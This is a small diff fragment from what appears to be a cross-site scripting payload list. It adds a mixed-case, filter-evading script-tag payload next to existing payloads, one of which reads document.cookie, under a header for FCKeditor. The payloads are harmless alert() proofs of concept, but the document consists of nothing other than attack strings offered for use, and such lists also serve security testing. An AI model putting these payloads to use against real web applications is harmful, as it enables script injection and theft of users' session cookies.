@@ -16,6 +16,8 @@ exploit :
 
 <sCript>alert("XSS")</sCript>
 
+()&%<acx><ScRiPt >alert("XSS")</ScRiPt>
+
 "><script>alert(document.cookie)</script>
 
 # Fckeditor
